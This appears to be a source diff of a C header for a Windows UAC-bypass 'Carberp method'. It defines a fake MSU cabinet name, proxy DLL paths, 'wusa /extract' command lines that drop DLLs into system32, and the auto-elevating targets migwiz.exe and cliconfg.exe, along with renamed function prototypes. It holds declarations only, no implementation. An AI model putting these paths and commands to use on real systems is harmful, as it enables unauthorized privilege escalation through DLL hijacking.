@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.H
 *
-*  VERSION:     1.50
+*  VERSION:     1.60
 *
-*  DATE:        05 Apr 2015
+*  DATE:        20 Apr 2015
 *
 *  Prototypes and definitions for Carberp method.
 *
@@ -17,14 +17,16 @@
 *
 *******************************************************************************/
 
-#define METHOD_CARBERP_MSUPACKAGE	L"%temp%\\huy32.msu"
+//default fake msu cabinet name
+#define T_MSUPACKAGE_NAME			L"%temp%\\ellocnak.msu"
+
 #define METHOD_MIGWIZ_SOURCEDLL		L"%temp%\\wdscore.dll"
 #define METHOD_MIGWIZ_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"
 #define METHOD_MIGWIZ_TARGETAPP		L"%systemroot%\\system32\\migwiz\\migwiz.exe"
 
-#define METHOD_SQLSVR_SOURCEDLL		L"%temp%\\ntwdblib.dll"
-#define METHOD_SQLSVR_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32"
-#define METHOD_SQLSVR_TARGETAPP		L"%systemroot%\\system32\\cliconfg.exe"
+#define METHOD_SQLSRV_SOURCEDLL		L"%temp%\\ntwdblib.dll"
+#define METHOD_SQLSRV_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32"
+#define METHOD_SQLSRV_TARGETAPP		L"%systemroot%\\system32\\cliconfg.exe"
 
 BOOL ucmWusaMethod(
 	DWORD dwType,
@@ -32,10 +34,12 @@ BOOL ucmWusaMethod(
 	DWORD ProxyDllSize
 	);
 
-BOOL ucmWusaCopyFile(
+BOOL ucmWusaExtractPackage(
+	LPWSTR lpCommandLine
+	);
+
+BOOL ucmCreateCabinetForSingleFile(
 	LPWSTR lpSourceDll,
-	LPWSTR lpMsuPackage,
-	LPWSTR lpCommandLine,
-	PVOID FileBuffer,
-	DWORD FileBufferSize
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
 	);
